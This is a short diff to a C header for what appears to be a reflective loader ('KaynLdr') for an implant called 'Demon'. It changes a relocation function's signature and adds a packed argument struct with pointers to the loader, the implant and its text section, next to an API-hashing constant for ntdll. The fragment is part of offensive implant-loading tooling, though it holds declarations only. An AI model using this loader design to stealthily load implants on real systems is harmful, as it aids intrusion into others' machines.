@@ -4,8 +4,9 @@
 
 UINT_PTR GetRIP( VOID );
 LPVOID   KaynCaller();
-VOID     KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID Dir );
+VOID     KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWORD KHdrSize );
 
+#define PAGE_SIZE                       4096
 #define MemCopy                         __builtin_memcpy
 #define NTDLL_HASH                      0x70e61753
 
@@ -59,3 +60,14 @@ typedef struct
     } Win32;
 
 } INSTANCE, *PINSTANCE;
+
+#pragma pack(1)
+typedef struct
+{
+    PVOID KaynLdr;
+    PVOID DllCopy;
+    PVOID Demon;
+    DWORD DemonSize;
+    PVOID TxtBase;
+    DWORD TxtSize;
+} KAYN_ARGS, *PKAYN_ARGS;
